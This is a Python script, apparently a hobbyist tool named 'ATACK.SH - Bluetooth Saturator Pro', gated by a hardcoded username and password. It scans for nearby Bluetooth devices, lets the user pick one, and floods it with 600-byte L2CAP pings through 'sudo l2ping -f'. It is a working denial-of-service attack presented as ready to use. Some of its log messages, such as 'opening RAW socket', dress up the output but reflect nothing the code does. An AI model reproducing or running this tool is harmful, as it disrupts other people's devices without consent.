import os
import sys
import time
import subprocess

# --- COLORES ---
V = '\033[1;32m' # Verde
R = '\033[1;31m' # Rojo
C = '\033[1;36m' # Cyan
A = '\033[1;33m' # Amarillo
M = '\033[1;35m' # Magenta
RS = '\033[0m'   # Reset

# --- CREDENCIALES ---
USER_CORRECTO = "atack.sh"
PASS_CORRECTA = "3tack.sh"

def login():
    os.system('clear')
    print(f"{M}╔════════════════════════════════════════════╗")
    print(f"║{RS}  {C}      SISTEMA DE ACCESO - 3TACK          {M}║")
    print(f"╚════════════════════════════════════════════╝{RS}")
    
    u = input(f"{C}──╼ {RS}Usuario: ")
    p = input(f"{C}──╼ {RS}Contraseña: ") # Nota: puedes usar getpass para ocultar
    
    if u == USER_CORRECTO and p == PASS_CORRECTA:
        print(f"\n{V}[+] ACCESO CONCEDIDO. BIENVENIDO ARIEL.{RS}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{R}[!] DATOS INCORRECTOS. ABORTANDO...{RS}")
        return False

def banner():
    os.system('clear')
    print(f"{M}╔════════════════════════════════════════════╗")
    print(f"║{RS}  {C}⚡ ATACK.SH - BLUETOOTH SATURATOR PRO ⚡  {M}║")
    print(f"╚════════════════════════════════════════════╝{RS}")

def verificar_hardware():
    print(f"{A}[*] Buscando antena Bluetooth real...{RS}")
    time.sleep(1)
    check = subprocess.getoutput("hciconfig")
    if "hci0" in check:
        print(f"{V}[+] HARDWARE ENCONTRADO: hci0{RS}")
        return True
    else:
        print(f"{R}[!] ERROR: Antena no detectada (hci0).{RS}")
        print(f"{A}[i] Asegúrate de ser ROOT y tener el BT encendido.{RS}")
        return False

def escanear():
    print(f"\n{C}[🔍] ESCANEANDO DISPOSITIVOS REALES...{RS}")
    print(f"{V}ID      MAC ADDRESS         NOMBRE{RS}")
    print(f"{C}------------------------------------------------------{RS}")
    
    scan_output = subprocess.getoutput("hcitool scan")
    lines = scan_output.split('\n')[1:]
    
    targets = []
    for i, line in enumerate(lines):
        parts = line.split()
        if len(parts) >= 2:
            mac = parts[0]
            nombre = " ".join(parts[1:])
            targets.append(mac)
            print(f"{A}{i+1}){RS}    {mac}    {nombre}")
    return targets

def iniciar_flood(mac):
    print(f"\n{R}🔥 INICIANDO SATURACIÓN SOBRE {mac}...{RS}")
    print(f"{A}[!] Enviando ráfagas L2CAP de 600 bytes...{RS}")
    time.sleep(2)
    try:
        # Requiere ROOT
        os.system(f"sudo l2ping -f -s 600 {mac}")
    except KeyboardInterrupt:
        print(f"\n{V}[+] Ataque detenido por el usuario.{RS}")

# --- FLUJO PRINCIPAL ---
if login():
    banner()
    if verificar_hardware():
        dispositivos = escanear()
        if not dispositivos:
            print(f"{R}[!] No hay objetivos visibles.{RS}")
        else:
            print(f"\n{C}──╼ Elige el ID del objetivo: {RS}", end="")
            try:
                opc = int(input())
                mac_target = dispositivos[opc-1]
                
                print(f"\n{V}[LOG] Abriendo socket RAW...")
                print(f"{V}[LOG] Inyectando ráfagas continuas...")
                iniciar_flood(mac_target)
            except:
                print(f"{R}[!] Selección inválida.{RS}")

